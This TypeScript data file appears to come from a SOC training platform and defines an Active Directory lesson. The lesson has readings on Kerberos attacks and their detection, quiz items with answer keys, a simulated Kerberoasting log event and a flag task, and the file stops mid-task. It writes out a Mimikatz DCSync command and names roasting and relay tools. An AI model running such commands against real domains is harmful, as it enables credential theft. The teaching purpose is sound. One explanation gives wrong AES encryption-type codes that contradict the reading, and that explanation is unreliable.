/**
 * Learning Rooms — Batch 03
 * Active Directory, Windows Event Logs, Linux Fundamentals, Linux Log Analysis
 *
 * Four intermediate-to-beginner rooms covering identity infrastructure,
 * Windows audit trail, and Linux fundamentals for SOC analysts.
 */

import type { TelemetryEvent } from "@/lib/sim/types";
import type {
  Room,
  ReadingTask,
  QuestionTask,
  LogAnalysisTask,
  FlagTask,
} from "@/data/rooms";

// ---------------------------------------------------------------------------
// Room 1 — Active Directory Fundamentals
// ---------------------------------------------------------------------------

const activeDirectory: Room = {
  id: "active-directory",
  title: "Active Directory Fundamentals",
  description:
    "Understand the identity backbone of every Windows enterprise: domain controllers, Kerberos authentication, GPOs, and the attack techniques that target them. Learn what to monitor as a SOC analyst.",
  difficulty: "intermediate",
  category: "Identity",
  estimatedMinutes: 50,
  xp: 450,
  icon: "🏢",
  prerequisites: ["windows-fundamentals"],
  tasks: [
    // -------------------------------------------------------------------------
    // Reading 1 — What is Active Directory?
    // -------------------------------------------------------------------------
    {
      type: "reading",
      id: "ad-r1",
      heading: "What Is Active Directory — and Why Does Every Company Use It?",
      content: `Imagine a large company with 2,000 employees. Each employee needs to log in to their computer, access shared folders on the file server, print to the office printer, and open the HR application. Without any central system, an IT administrator would have to create a separate account on every single computer, every server, and every application for every employee — 2,000 accounts multiplied by dozens of systems. Changing one person's password or revoking access when they leave the company would be a nightmare.\n\n**Active Directory (AD)** solves this problem. Think of it as the company's central HR department combined with a master security badge system. Every employee gets one account in Active Directory. That single account controls what they can log in to, what files they can open, what printers they can use, and what applications they can access — everywhere in the company. When an employee leaves, IT disables their one AD account and access is revoked everywhere instantly.\n\nMicrosoft introduced Active Directory in Windows 2000, and it now runs in the vast majority of enterprises worldwide. As a SOC analyst, almost every investigation you do in a Windows environment will touch Active Directory in some way. Understanding it is not optional — it is foundational.\n\n**Domain vs. Workgroup**\n\nWindows computers can operate in one of two modes:\n\n- **Workgroup**: Each computer manages its own accounts locally. Fine for home use or a tiny office of 3–5 people. There is no central control. If you change your password on your laptop, it has no effect on your desktop PC.\n- **Domain**: All computers are joined to a central directory (Active Directory). One account works everywhere. IT can enforce policies on all machines from a single location. This is how every company with more than a handful of staff operates.\n\n**The Domain Controller (DC) — The Brain of AD**\n\nA **Domain Controller** is a Windows Server that runs Active Directory Domain Services (AD DS). It is the most critical server in the entire company. Here is what it does:\n\n- Stores the directory database — every user account, computer account, and group\n- Authenticates users when they log in (are you who you say you are?)\n- Authorises access (are you allowed to open that file?)\n- Runs the **Kerberos Key Distribution Center (KDC)** — the authentication engine\n- Hosts the **SYSVOL** share — where Group Policy settings are stored and replicated\n\nIf the Domain Controller goes down, users cannot log in to new sessions, printers stop working, and shared drives become inaccessible. This is why companies always have at least two Domain Controllers for redundancy, and why attackers target them so aggressively. Compromising a DC typically means owning the entire company.\n\n**Forest, Domain, Organizational Units (OUs)**\n\nActive Directory has a hierarchical structure, like a set of nested containers:\n\n- **Forest**: The outermost boundary. A forest can contain one or more domains. The first domain created is the **forest root domain**. All domains in a forest share a common schema (the list of attribute types that objects can have) and a Global Catalog.\n- **Domain**: The main administrative unit. Has a DNS name like **corp.contoso.com**. Users, computers, and groups live inside domains.\n- **Domain Tree**: Multiple domains sharing a contiguous DNS namespace (e.g., contoso.com with child domains us.contoso.com and eu.contoso.com form a tree).\n- **Organizational Units (OUs)**: Folders inside a domain used to organise objects. A company might have OUs for each department: IT, Finance, HR, Marketing. OUs are important because **Group Policies can be applied to an OU**, affecting all objects inside it.\n\n**Users, Computers, and Groups**\n\nThree core object types live in Active Directory:\n\n- **User objects**: Represent people. Have a username (sAMAccountName like j.smith), a password, email, phone number, department, and dozens of other attributes.\n- **Computer objects**: Every Windows PC or server joined to the domain gets a computer object in AD. This allows policies to be applied to machines, not just people.\n- **Group objects**: Collections of users and/or computers. Two types matter:\n  - **Security Groups**: Used for access control. Add a user to the "Finance" security group and they automatically gain access to finance file shares. Remove them from the group and access is revoked immediately.\n  - **Distribution Groups**: Used only for email distribution lists in Exchange/Outlook. They do NOT control access to anything. A common beginner mistake is confusing these two.\n\n**Group Policy Objects (GPOs)**\n\nGroup Policy is AD's remote configuration and enforcement system. A **GPO** is a collection of settings that Active Directory pushes down to computers and users. Examples:\n\n- Force all computers to lock the screen after 5 minutes of inactivity\n- Require passwords to be at least 12 characters long\n- Prevent users from installing software\n- Map a network drive automatically when a user logs in\n- Deploy software updates\n\nGPOs are linked to OUs, domains, or sites. Every time a user logs in or a computer starts up, it contacts the DC and applies any GPOs that apply to it. This is a common attacker target: if an attacker can modify a GPO linked to "All Computers", they can push a malicious script to every machine in the company simultaneously.\n\n**Trust Relationships**\n\nSometimes two separate domains or forests need to let their users access each other's resources. This is done with **trusts**:\n\n- **One-way trust**: Domain A trusts Domain B. Users in B can access resources in A, but not vice versa.\n- **Two-way trust**: Both domains trust each other's users.\n- **Transitive trust**: If A trusts B and B trusts C, then A implicitly trusts C. All trusts within a forest are automatically transitive.\n\nTrusts can be dangerous if misconfigured — a compromise in a less-secure trusted domain can be a path into a more-secure domain.`,
    } satisfies ReadingTask,

    // -------------------------------------------------------------------------
    // Reading 2 — Kerberos Authentication Deep Dive
    // -------------------------------------------------------------------------
    {
      type: "reading",
      id: "ad-r2",
      heading: "Kerberos Authentication — How AD Proves Who You Are",
      content: `When you type your username and password at a Windows login screen, you are starting a process called **Kerberos authentication**. Kerberos is a network authentication protocol invented at MIT in the 1980s and still the primary authentication method in Active Directory today. Understanding it is critical because many of the most dangerous AD attacks specifically target the Kerberos system.\n\nThe analogy: imagine a theme park. When you arrive, you show your ID at the front gate (the KDC). The gate gives you a **wristband** (a Kerberos ticket). For the rest of the day, you show your wristband to get into individual rides (services) without showing your ID again. The wristband proves the gate already checked you.\n\n**The Key Players**\n\n- **KDC (Key Distribution Center)**: Runs on every Domain Controller. Has two components: the **Authentication Server (AS)** and the **Ticket-Granting Service (TGS)**. The KDC knows the secret keys of every user and service in the domain.\n- **TGT (Ticket-Granting Ticket)**: A ticket you receive after proving your password. This is your wristband. It proves to the KDC that you already authenticated. TGTs are typically valid for 10 hours.\n- **Service Ticket / TGS ticket**: A ticket for a specific service (like the file server or the web application). Obtained by presenting your TGT.\n\n**Step-by-Step Kerberos Flow**\n\n**Step 1 — AS-REQ (Authentication Service Request)**\nYour computer sends an AS-REQ to the KDC saying "I am user j.smith". It includes a timestamp encrypted with a key derived from j.smith's password. This proves you know the password without sending the password over the network.\n\n**Step 2 — AS-REP (Authentication Service Response)**\nIf the KDC validates the encrypted timestamp, it sends back a **TGT** encrypted with the KDC's own secret key (the krbtgt account key). Only the KDC can read or forge a TGT. The KDC also sends a session key your computer can use for further communication.\nWindows Event ID **4768** is logged when a TGT is issued.\n\n**Step 3 — TGS-REQ (Ticket-Granting Service Request)**\nWhen you try to access a service (say, the file server FS01), your computer presents your TGT to the KDC and says "I need a ticket for the CIFS service on FS01".\n\n**Step 4 — TGS-REP (Ticket-Granting Service Response)**\nThe KDC returns a **Service Ticket** encrypted with the file server's secret key. Your computer cannot read this ticket — only FS01 can.\nWindows Event ID **4769** is logged when a service ticket is issued.\n\n**Step 5 — AP-REQ (Application Request)**\nYour computer sends the service ticket to FS01. FS01 decrypts it with its own key, reads your identity and privileges, and decides whether to let you in. No password ever crosses the wire after step 1.\n\n**Why Kerberos Tickets Are Attack Targets**\n\nBecause Kerberos tickets are the proof of identity, stealing or forging them bypasses the need for passwords entirely:\n\n- **Pass-the-Ticket**: An attacker steals a valid TGT from memory (using tools like Mimikatz) and injects it into their own session. They become that user without knowing their password.\n- **Kerberoasting**: Service tickets for accounts that run services are encrypted with the service account's password key. An attacker requests a service ticket for a high-privilege service account, takes the encrypted blob offline, and uses a password cracker to brute-force the original password. Any domain user can request service tickets, so this attack requires no special privileges.\n  - Indicator: **EncryptionType 0x17 (RC4-HMAC)** in Event ID 4769. Modern environments use AES (0x11 = AES-128 / 0x12 = AES-256). RC4 ticket requests are highly suspicious because attackers prefer RC4 — it is faster to crack.\n- **Golden Ticket**: The KDC signs all TGTs with the **krbtgt** account password. If an attacker can extract the krbtgt password hash (which requires DC-level access), they can forge TGTs for any user, including fake accounts, with any expiry time — even years in the future. This is one of the most powerful attacks in Windows environments.\n- **Silver Ticket**: Instead of forging a TGT, the attacker forges a service ticket directly using the service account's password hash. More limited in scope but harder to detect because it never touches the KDC.\n\n**LDAP — Querying Active Directory**\n\n**LDAP (Lightweight Directory Access Protocol)** is the protocol used to query and modify the Active Directory database. Every time something looks up a user's details, checks group membership, or searches for computers, it uses LDAP.\n\nLDAP queries follow a format like: \`(objectClass=user)(sAMAccountName=j.smith)\`\n\n**Attackers use LDAP enumeration** (tools like BloodHound, ldapsearch, or ADExplorer) to map the entire AD environment — all users, all groups, all trust relationships, all GPOs. This gives them a roadmap for privilege escalation before they ever touch a sensitive system. Seeing large volumes of LDAP queries from an unusual host or service account is a red flag.\n\n**DCSync — The Most Dangerous AD Attack**\n\nDomain Controllers replicate their data to each other using the **Directory Replication Service (DRS) protocol**. An attacker with specific permissions (DS-Replication-Get-Changes) can impersonate a Domain Controller and request a copy of all password hashes from the real DC. This is called **DCSync**. With all password hashes, the attacker owns every account in the domain. Mimikatz can perform DCSync with the command \`lsadump::dcsync /user:krbtgt\`. Event ID **4662** with the specific GUID for replication rights is the indicator.`,
    } satisfies ReadingTask,

    // -------------------------------------------------------------------------
    // Reading 3 — AD Attack Techniques and What to Monitor
    // -------------------------------------------------------------------------
    {
      type: "reading",
      id: "ad-r3",
      heading: "AD Attack Techniques and SOC Monitoring",
      content: `Active Directory is the crown jewel of nearly every Windows enterprise. Attackers know this — compromising AD means compromising the whole company. As a SOC analyst, you need to know both the attack techniques and the log signatures that reveal them.\n\n**Pass-the-Hash (PtH)**\nWindows can authenticate users using just the **NTLM hash** of their password — the scrambled version stored on disk — without ever knowing the original password. Tools like Mimikatz can dump these hashes from memory. An attacker with a hash can authenticate as that user across the network.\n- Detection: Event ID **4624 with LogonType 3** (network logon) from unexpected sources, especially for privileged accounts. High volume from a single source.\n\n**Pass-the-Ticket (PtT)**\nAn attacker extracts a valid Kerberos TGT from a compromised machine's memory and imports it into their own session, becoming that user.\n- Detection: Unusual Kerberos ticket activity, tickets being used from different IP addresses than where they were issued.\n\n**Kerberoasting**\nAny domain user can request a Kerberos service ticket for any service. The ticket is encrypted with the service account's password hash. Offline cracking reveals the password.\n- Detection: Event ID **4769** with EncryptionType **0x17** (RC4), especially for high-value service accounts. Multiple 4769 events from one user requesting tickets for many different services.\n\n**Golden Ticket**\nWith the **krbtgt** account hash, an attacker can forge any TGT for any user with any expiry.\n- Detection: Extremely difficult to detect without specialised tools. Look for tickets with unusually long lifetimes, or tickets for accounts that don't exist. Microsoft ATA and Microsoft Defender for Identity (MDI) have specific detections.\n\n**DCSync**\nImpersonating a DC to replicate all password hashes.\n- Detection: Event ID **4662** (access to directory service object) with properties containing the GUIDs for **DS-Replication-Get-Changes** and **DS-Replication-Get-Changes-All**, from an account that is NOT a known Domain Controller.\n\n**BloodHound Enumeration**\nThe BloodHound tool maps all AD relationships (group memberships, admin rights, trust paths) to find the shortest path to Domain Admin.\n- Detection: Large volumes of LDAP queries from a single workstation, especially queries for group memberships, ACLs, and SPNs. Microsoft Defender for Identity alerts on this specifically.\n\n**What SOC Analysts Should Monitor in AD**\n\n- **Event ID 4768**: Kerberos TGT requested. Watch for RC4 encryption (EncryptionType 0x17) and failures.\n- **Event ID 4769**: Kerberos service ticket requested. Watch for RC4 and high-volume requests.\n- **Event ID 4625**: Failed logon. Multiple failures from one source = brute force or spray.\n- **Event ID 4624 LogonType 3**: Network logon. Lateral movement typically uses this type.\n- **Event ID 4720**: User account created. Any new account is worth verifying.\n- **Event ID 4728 / 4732**: User added to a security group. Addition to Domain Admins or similar is critical.\n- **Event ID 4672**: Special privileges assigned at logon. This fires for every admin logon.\n- **Event ID 4662**: Directory service object access. DCSync detection.\n- **Event ID 4776**: NTLM authentication attempt. Pass-the-Hash often uses NTLM.\n- **Event ID 1102**: Audit log cleared. Attackers clear logs to hide their tracks.\n\n**Principle of Least Privilege in AD**\nA healthy AD environment follows the principle that users and service accounts should have only the minimum permissions they need. Signs of poor AD hygiene that attackers exploit:\n- Service accounts with Domain Admin rights (Kerberoasting becomes catastrophic)\n- Users in multiple admin groups\n- GPOs delegated to non-admin users\n- Stale accounts that were never disabled when employees left\n\nAs a SOC analyst, when you see a high-privilege account doing something unusual — especially from a workstation rather than a server — treat it as a priority alert.`,
    } satisfies ReadingTask,

    // -------------------------------------------------------------------------
    // Question 1
    // -------------------------------------------------------------------------
    {
      type: "question",
      id: "ad-q1",
      question:
        "A company with 5,000 employees needs a way to manage all user accounts centrally so that one account works on all systems and IT can enforce password policies everywhere. Which Windows infrastructure does this?",
      options: [
        "A Workgroup where each PC manages its own accounts",
        "Active Directory Domain Services with a Domain Controller",
        "A shared Excel spreadsheet listing all usernames and passwords",
        "Windows Firewall with shared rules across all machines",
      ],
      answer: 1,
      explanation:
        "Active Directory Domain Services (AD DS), running on Domain Controllers, provides centralised identity management. One account per user works across all domain-joined systems, and Group Policy enforces settings on all machines simultaneously. A Workgroup has no central control — each machine is independent.",
      xp: 20,
    } satisfies QuestionTask,

    // -------------------------------------------------------------------------
    // Question 2 — Kerberos flow
    // -------------------------------------------------------------------------
    {
      type: "question",
      id: "ad-q2",
      question:
        "During Kerberos authentication, what does Event ID 4768 represent, and where is it logged?",
      options: [
        "A Service Ticket (TGS) was issued — logged on the file server that was accessed",
        "A Ticket-Granting Ticket (TGT) was requested — logged on the Domain Controller",
        "A user's password was reset — logged in the Application event log",
        "A new computer joined the domain — logged on the workstation",
      ],
      answer: 1,
      explanation:
        "Event ID 4768 is a Kerberos Authentication Service request — the very first step where a user requests a TGT from the KDC. It is always logged on the Domain Controller in the Security event log, because the KDC runs on the DC. Event ID 4769 is the Service Ticket request (TGS).",
      xp: 25,
    } satisfies QuestionTask,

    // -------------------------------------------------------------------------
    // Question 3 — Kerberoasting indicator
    // -------------------------------------------------------------------------
    {
      type: "question",
      id: "ad-q3",
      question:
        "You are reviewing Event ID 4769 logs (Kerberos Service Ticket requests). Which field and value is the primary indicator of a Kerberoasting attack?",
      options: [
        "TicketEncryptionType: 0x12 (AES-256) — modern, secure encryption",
        "TicketEncryptionType: 0x17 (RC4-HMAC) — older, weaker encryption preferred by attackers for offline cracking",
        "FailureCode: 0x12 — indicating the account is disabled",
        "LogonType: 10 — indicating a remote interactive session",
      ],
      answer: 1,
      explanation:
        "Kerberoasting works by requesting service tickets encrypted with RC4 (EncryptionType 0x17) because RC4 hashes are much faster to crack offline than AES. Modern Windows environments default to AES (0x12 = AES-128, 0x18 = AES-256). Seeing RC4 ticket requests for service accounts — especially in large numbers — is a strong Kerberoasting indicator.",
      xp: 30,
    } satisfies QuestionTask,

    // -------------------------------------------------------------------------
    // Log Analysis — Kerberos TGT with suspicious encryption
    // -------------------------------------------------------------------------
    {
      type: "log_analysis",
      id: "ad-la1",
      heading: "Suspicious Kerberos Ticket Request",
      context:
        "Your SIEM has alerted on an unusual Kerberos activity on the Domain Controller. A user account has requested a Kerberos service ticket with an older encryption type. Review the event below and answer the questions.",
      event: {
        id: "ad-evt-001",
        ts: "2024-11-14T02:17:33.000Z",
        source: "ad",
        vendor: "Windows Security",
        event_type: "kerberos_tgs",
        severity: "high",
        hostname: "DC01.corp.contoso.com",
        description:
          "Kerberos Service Ticket request with RC4 encryption — possible Kerberoasting",
        mitre_technique: "T1558.003",
        mitre_tactic: "Credential Access",
        authentication: {
          method: "Kerberos",
          result: "Success",
          logon_type: 3,
        },
        raw: {
          "event.code": "4769",
          "winlog.channel": "Security",
          "winlog.computer_name": "DC01.corp.contoso.com",
          "winlog.event_data.TargetUserName": "svc_sqlbackup",
          "winlog.event_data.TargetDomainName": "CORP",
          "winlog.event_data.ServiceName": "MSSQLSvc/sqlsrv01.corp.contoso.com:1433",
          "winlog.event_data.TicketEncryptionType": "0x17",
          "winlog.event_data.TicketOptions": "0x40810000",
          "winlog.event_data.Status": "0x0",
          "winlog.event_data.IpAddress": "10.10.25.88",
          "winlog.event_data.IpPort": "54321",
          "winlog.event_data.RequestorName": "j.harrison@corp.contoso.com",
          "winlog.event_id": 4769,
          "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
          "@timestamp": "2024-11-14T02:17:33.000Z",
        },
      } satisfies TelemetryEvent,
      questions: [
        {
          question:
            "What is the name of the service account whose ticket was requested, and why is that significant?",
          options: [
            "j.harrison — because j.harrison is the attacker and all their actions are suspicious",
            "svc_sqlbackup — a service account for SQL Server backup, which likely has elevated database privileges, making it a high-value Kerberoasting target",
            "MSSQLSvc — this is the service name and has no bearing on the attack",
            "DC01 — the Domain Controller is the target of the attack",
          ],
          answer: 1,
          explanation:
            "The TargetUserName field shows 'svc_sqlbackup'. Service accounts like this one often have weak passwords (set once and never changed) and elevated privileges. This makes them prime Kerberoasting targets — an attacker requests a service ticket encrypted with svc_sqlbackup's password hash, then cracks it offline. The RequestorName (j.harrison) may itself be a compromised account.",
          xp: 30,
        },
        {
          question:
            "The TicketEncryptionType is 0x17. What does this mean, and why is it suspicious at 02:17 AM?",
          options: [
            "0x17 means AES-256 encryption — the most secure type, so this is expected behaviour",
            "0x17 means RC4-HMAC encryption — an older algorithm that is faster to crack offline; combined with the 2 AM timestamp when no legitimate user would be working, this strongly suggests automated Kerberoasting",
            "0x17 means the ticket was denied — the attacker failed",
            "0x17 means the account is a member of Domain Admins",
          ],
          answer: 1,
          explanation:
            "EncryptionType 0x17 = RC4-HMAC, which is much weaker than AES and specifically sought out by Kerberoasting tools (Rubeus, Impacket GetUserSPNs). RC4 hashes can be cracked orders of magnitude faster than AES. Combined with the unusual 02:17 AM timestamp — when legitimate SQL backup jobs would use automated service accounts, not interactive user sessions — this pattern is highly indicative of Kerberoasting.",
          xp: 35,
        },
      ],
    } satisfies LogAnalysisTask,

    // -------------------------------------------------------------------------
    // Question 4 — Groups
    // -------------------------------------------------------------------------
    {
      type: "question",
      id: "ad-q4",
      question:
        "An IT admin creates a group in Active Directory and adds all Finance department users to it, giving the group Read/Write access to the Finance file share. What type of AD group is this?",
      options: [
        "Distribution Group — used for controlling access to shared resources",
        "Security Group — used for controlling access to resources and applying permissions",
        "Universal Group — used only for email in Exchange Online",
        "Computer Group — used for organising workstations",
      ],
      answer: 1,
      explanation:
        "Security Groups are the AD group type used to control access to resources like file shares, printers, and applications. Distribution Groups are only used for email distribution lists and cannot be assigned permissions. This is a common point of confusion — if a group controls access to anything, it must be a Security Group.",
      xp: 20,
    } satisfies QuestionTask,

    // -------------------------------------------------------------------------
    // Question 5 — DCSync
    // -------------------------------------------------------------------------
    {
      type: "question",
      id: "ad-q5",
      question:
        "An attacker has gained DS-Replication-Get-Changes-All permissions on the domain. What attack can they now perform, and what is the catastrophic result?",
      options: [
        "Kerberoasting — they can crack service account passwords one at a time",
        "DCSync — they can impersonate a Domain Controller and pull ALL password hashes from Active Directory, effectively owning every account in the domain",
        "Pass-the-Ticket — they can reuse a single TGT to access one service",
        "Golden Ticket — they can forge TGTs but only for accounts they already know about",
      ],
      answer: 1,
      explanation:
        "DCSync exploits the legitimate DC replication protocol (DRS). With DS-Replication-Get-Changes-All permission, an attacker uses Mimikatz's 'lsadump::dcsync' command to pull the NTLM hash and Kerberos keys of any account — including krbtgt — from a live DC without ever logging into it. This is catastrophic because it gives the attacker every credential in the domain. Detected via Event ID 4662 with replication GUIDs from a non-DC host.",
      xp: 30,
    } satisfies QuestionTask,

    // -------------------------------------------------------------------------
    // Flag Task
    // -------------------------------------------------------------------------
    {
      type: "flag",
      id: "ad-flag1",
      prompt:
        "Look at the log analysis event above (Event ID 4769). What is the exact TicketEncryptionType value in hexadecimal that indicates Kerberoasting? Enter it exactly as shown in the raw log (e.g. 0x17).",
      answer: "0x17",
      hint: "Look at the 'winlog.event_data.TicketEncryptionType' field in the raw log. It should be a hexadecimal value starting with '0x'. RC4-HMAC is the older, weaker algorithm.",
      xp: 40,
    } satisfies FlagTask,

    // -------------------------------------------------------------------------
    // Question 6 — Golden Ticket
    // -------------------------------------------------------------------------
    {
      type: "question",
      id: "ad-q6",
      question:
        "What makes a Golden Ticket attack so uniquely dangerous compared to other Kerberos attacks?",
      options: [
        "It only works against one specific user account and expires after 10 hours like a normal TGT",
        "It requires the attacker to know the plaintext password of every account they want to impersonate",
        "It uses the krbtgt account's password hash to forge TGTs for ANY user with ANY expiry — including fake accounts — and can persist even after all user passwords are reset",
        "It requires physical access to the Domain Controller to inject the forged ticket",
      ],
      answer: 2,
      explanation:
        "The krbtgt account is used to sign all TGTs in the domain. If an attacker obtains its hash (via DCSync or extracting it from DC memory), they can forge TGTs for any user — real or fictional — with any expiry date and any privileges. Even resetting all user passwords does not help, because the Golden Ticket is signed with krbtgt's key, not the user's key. The only remediation is resetting the krbtgt password twice (to invalidate all outstanding tickets).",
      xp: 30,
    } satisfies QuestionTask,

    // -------------------------------------------------------------------------
    // Reading 4 — AS-REP Roasting (Kerberoasting's quieter sibling)
    // -------------------------------------------------------------------------
    {
      type: "reading",
      id: "ad-r4",
      heading: "AS-REP Roasting — Attacking Accounts With Pre-Authentication Disabled",
      content: `You already learned Kerberoasting: an attacker requests a service ticket (TGS) for a service account and cracks the encrypted reply offline. **AS-REP Roasting** is Kerberoasting's quieter sibling — it targets the very first step of Kerberos authentication instead, and it works without the attacker ever needing to authenticate at all.\n\nRecall from Reading 2: the normal Kerberos flow starts with an **AS-REQ**, where your computer proves it knows your password by sending the KDC a timestamp encrypted with a key derived from that password. This encrypted timestamp is called **Kerberos pre-authentication**, and it exists specifically to stop an attacker from requesting a TGT for an account without knowing that account's password first.\n\n**The vulnerability: pre-authentication can be disabled.** Every AD user account has an attribute called 'DONT_REQ_PREAUTH' (visible in AD as the "Do not require Kerberos preauthentication" checkbox under the account's Account tab). When this flag is set, the KDC will hand out an **AS-REP** (the encrypted TGT reply) to *anyone* who asks for that specific username — no password, no proof of identity, nothing. This setting is rare in a well-run domain, but it turns up more often than you'd expect: legacy applications that predate modern Kerberos tooling, accounts migrated from older domains, or simple misconfiguration.\n\n**How the attack works, step by step:**\n1. The attacker does **not** need any credentials or domain access beyond basic network connectivity to a Domain Controller — this can even be run pre-authentication from an unauthenticated position in some configurations, but is most commonly run by an attacker who already has a low-privilege foothold and wants to escalate quietly.\n2. Using a tool like Impacket's 'GetNPUsers.py' or Rubeus's 'asreproast' module, the attacker requests a list of usernames — pulled from earlier LDAP enumeration — and asks the KDC for an AS-REP for each one.\n3. For any account with 'DONT_REQ_PREAUTH' set, the KDC replies immediately with an AS-REP. Part of that reply — the encrypted portion — is encrypted using a key derived from the target account's password (RC4-HMAC in older/misconfigured domains, which is fast to crack; AES in hardened domains, which is much slower).\n4. The attacker takes this encrypted blob **offline** and runs it through a password cracker (Hashcat mode 18200, or John the Ripper). Because there is no live connection to the KDC during cracking, there is **no lockout, no rate limit, and no additional log entries** — the entire cracking process is invisible to the SOC.\n5. Once cracked, the attacker has that account's plaintext password and can log in normally — which is where the attack chain becomes visible again.\n\n**Why AS-REP Roasting is dangerous specifically because it's quiet:** Kerberoasting requires requesting a *service* ticket (Event ID 4769), which at least proves the requesting account was authenticated. AS-REP Roasting requests happen at the very first, pre-authentication stage — before any password is checked — so a successful roast against a vulnerable account produces exactly **one** Kerberos event (an Event ID 4768 AS-REQ/AS-REP exchange) with nothing else to correlate against. The actual password cracking that follows generates **zero logs of any kind**, because it happens entirely on the attacker's own machine.\n\n**The detection signature — Event ID 4768, field PreAuthType:** When a Domain Controller issues a TGT, it logs Event ID 4768 (the same event ID used for every normal, legitimate login). The field that tells you whether pre-authentication was actually used is **PreAuthType**:\n- **PreAuthType = 2** — Normal: the client proved knowledge of the password with an encrypted timestamp. This is what 99% of your 4768 events should look like.\n- **PreAuthType = 0** — No pre-authentication was used. Either this is a legitimately misconfigured account being probed by an attacker, or — even worse — you are looking at an actual AS-REP Roasting attempt in progress.\n\nA single 4768 with PreAuthType 0 for an account that should never have that flag set is a strong indicator someone just requested a roastable AS-REP. If the *same account* generates a normal, PreAuthType=2 login hours later from a different, unrelated host, that gap is consistent with offline cracking having succeeded in between.\n\n**Prevention and remediation:** Audit AD for any account with 'DONT_REQ_PREAUTH' set (the PowerShell cmdlet 'Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}') and disable the flag unless there is a documented legacy-application reason for it. For any account that must keep it disabled, enforce a long, high-entropy password so offline cracking is infeasible even with the AS-REP in hand.`,
    } satisfies ReadingTask,

    // -------------------------------------------------------------------------
    // Reading 5 — LLMNR/NBT-NS Poisoning and NTLM Relay
    // -------------------------------------------------------------------------
    {
      type: "reading",
      id: "ad-r5",
      heading: "LLMNR/NBT-NS Poisoning and NTLM Relay — Stealing Authentication Without Cracking Anything",
      content: `So far every credential attack you have studied — password spray, Kerberoasting, AS-REP Roasting — ends the same way: the attacker obtains an encrypted or hashed secret and must crack it offline before it becomes useful. **NTLM Relay** is different. The attacker never cracks anything at all. Instead, they trick a victim machine into authenticating *directly to them*, then forward (relay) that live authentication attempt to a real target server in real time — effectively borrowing the victim's identity for a single, one-shot login.\n\n**Step 1 — How the attacker gets a victim to authenticate to them: LLMNR/NBT-NS poisoning.** Windows machines have a legacy fallback name-resolution behaviour left over from before every network reliably had a working DNS server. If a Windows machine tries to resolve a hostname and normal DNS fails (a classic case: a user mistypes a network share name, e.g. \\\\flie-server\\finance instead of \\\\file-server\\finance), the machine does not just give up. It broadcasts the request to the entire local subnet using two legacy protocols:\n- **LLMNR (Link-Local Multicast Name Resolution)** — a UDP multicast on port 5355, asking "does anyone on this network know the address for 'flie-server'?"\n- **NBT-NS (NetBIOS Name Service)** — an older, UDP port 137 equivalent doing the same job.\n\nBoth protocols trust the **first machine that answers** — there is no authentication or verification of who is allowed to respond. An attacker running a tool called **Responder** (or Inveigh on Windows) sits on the same local network, silently listens for these broadcast requests, and answers *every single one* claiming "that's me — send your authentication here." Because the victim's machine believes it is now talking to the legitimate file server it originally asked for, it automatically sends its **NTLM authentication** (its username and an NTLM challenge-response, generated using the user's password hash) straight to the attacker — no user interaction, no warning, nothing.\n\n**Step 2 — What the attacker does with that captured authentication: relay, not just capture.** A less sophisticated attacker would simply take the captured NTLM hash offline and try to crack it — this works, but only if the underlying password is weak. A more dangerous move is **relaying**: instead of storing the captured authentication, the attacker immediately forwards it, live, to a *different* target server that the victim's account has access to (very commonly another workstation, a file server, or worse, a server running Exchange or a Certificate Authority for AD CS). Because NTLM authentication in this scenario has no SMB signing check to prevent it, the receiving server accepts the relayed authentication as if the *victim* had genuinely logged in — and the attacker now has an active, authenticated session as that user on the target server, without ever knowing the password and without cracking a single hash.\n\n**Why this evades naive detection:** Nothing about this attack looks like brute force (there's no failed-login flood) and nothing looks like a stolen-credential replay from an unusual location (the traffic is entirely internal, machine-to-machine, at normal speed). The only visible artefacts are: LLMNR/NBT-NS broadcast traffic on ports 5355/137 (routine background noise on almost every Windows network, which is exactly what makes it a good disguise), followed by an NTLM authentication (Event ID 4624/4625, AuthenticationPackageName = NTLM) where the **WorkstationName field does not match the source IP the login actually came from** — because the victim thinks they're logging into their intended target, but the login is really landing on (or via) the attacker's machine.\n\n**The detection tell — mismatched WorkstationName vs. source IP.** In a legitimate NTLM logon, the WorkstationName field (the hostname the client claims to be logging in from) and the IpAddress field (the actual network source of the authentication) refer to the same machine. In an NTLM relay attack, the victim's *account* authenticates from the *attacker's* IP address, while WorkstationName may still show the victim's own hostname — or vice versa, depending on exactly how the relay is staged. Either way, correlating WorkstationName against IpAddress and flagging any mismatch is one of the highest-fidelity NTLM relay detections available, because it requires no threat intelligence and no baseline — just internal log consistency.\n\n**Prevention (the fixes a SOC should recommend, even though implementing them is IT's job, not yours):** Disable LLMNR and NBT-NS entirely via Group Policy on networks where legacy name resolution isn't required (most modern networks don't need it). Enable **SMB signing** enforcement, which cryptographically signs every SMB session and makes relayed authentication fail even if captured. Where LLMNR/NBT-NS cannot be disabled, deploy a canary/honeytoken account specifically designed to alert if it is ever used to answer a poisoned request.`,
    } satisfies ReadingTask,

    // -------------------------------------------------------------------------
    // Question 7 — AS-REP Roasting detection
    // -------------------------------------------------------------------------
    {
      type: "question",
      id: "ad-q7",
      question:
        "You are reviewing Event ID 4768 (Kerberos TGT request) logs on a Domain Controller and see an entry for account 'svc-legacy-print' with PreAuthType = 0. What does this indicate, and why is it a high-value finding?",
      options: [
        "PreAuthType 0 just means the account used AES256 encryption — this is normal and secure",
        "PreAuthType 0 means Kerberos pre-authentication was not performed for this request — the account has 'Do not require Kerberos preauthentication' enabled, making it vulnerable to AS-REP Roasting: any attacker can request its AS-REP and crack the password offline with zero further logging",
        "PreAuthType 0 means the account's password has expired and must be reset before the ticket is valid",
        "PreAuthType 0 is a benign default value that appears on roughly half of all legitimate logins",
      ],
      answer: 1,
      explanation:
        "PreAuthType 2 is the normal, expected value — it means the client proved knowledge of the password via an encrypted timestamp before the KDC issued a TGT. PreAuthType 0 means pre-authentication was skipped entirely, which only happens when the account has the 'DONT_REQ_PREAUTH' flag set. Any domain user — with no special privileges — can request an AS-REP for such an account and crack the encrypted reply offline (Hashcat mode 18200), with no further Kerberos events generated during the cracking phase. This is functionally the same class of attack as Kerberoasting but targets the very first authentication step instead of a service ticket, and requires even less attacker access to pull off.",
      xp: 30,
    } satisfies QuestionTask,

    // -------------------------------------------------------------------------
    // Log Analysis — NTLM Relay via LLMNR Poisoning
    // -------------------------------------------------------------------------
    {
      type: "log_analysis",
      id: "ad-la2",
      heading: "Mismatched Workstation Name — Possible NTLM Relay",
      context:
